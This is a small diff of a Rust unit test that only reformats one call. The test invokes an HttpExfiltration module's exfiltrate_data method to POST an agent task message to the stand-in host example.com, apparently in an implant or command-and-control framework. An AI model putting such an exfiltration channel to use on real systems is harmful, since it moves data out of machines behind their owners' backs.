@@ -59,7 +59,9 @@ mod tests {
         let config = WebCommsConfig::default();
         let exfil = HttpExfiltration::new(&config);
         let msg = WebCommsMessage::TaskRequest("agent-001".to_string());
-        let result = exfil.exfiltrate_data("https://example.com", &msg, "POST").await;
+        let result = exfil
+            .exfiltrate_data("https://example.com", &msg, "POST")
+            .await;
         assert!(result.is_ok());
     }
 
